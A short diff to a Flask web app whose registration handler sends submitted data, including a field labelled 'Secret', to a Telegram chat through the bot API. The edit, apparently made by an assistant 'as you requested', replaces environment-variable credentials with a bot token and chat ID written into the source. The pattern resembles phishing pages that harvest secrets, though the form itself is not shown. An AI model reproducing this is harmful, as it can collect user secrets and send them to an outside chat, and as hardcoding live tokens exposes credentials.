@@ -1,15 +1,15 @@
 from flask import Flask, request, jsonify, render_template
 import requests
-import os
 
 app = Flask(__name__)
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-CHAT_ID = os.environ.get("CHAT_ID")
+# Hardcoded Telegram credentials (as you requested)
+BOT_TOKEN = "7271224033:AAH22jbuHkyvJQuiP_HhqMeN9NjADo6J7vk"
+CHAT_ID = "-1002826854422"
 
 @app.route("/")
 def home():
-    return render_template("register.html")
+    return render_template("register.html")  # Make sure this file exists in the 'templates' folder
 
 @app.route("/register", methods=["POST"])
 def register():
@@ -27,8 +27,11 @@ def register():
         f"Secret: {secret}"
     )
 
-    url = f"https://api.telegram.org/bot{7271224033:AAH22jbuHkyvJQuiP_HhqMeN9NjADo6J7vk}/sendMessage"
-    payload = {"-1002826854422": CHAT_ID, "text": message}
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": CHAT_ID,
+        "text": message
+    }
 
     try:
         res = requests.post(url, json=payload)
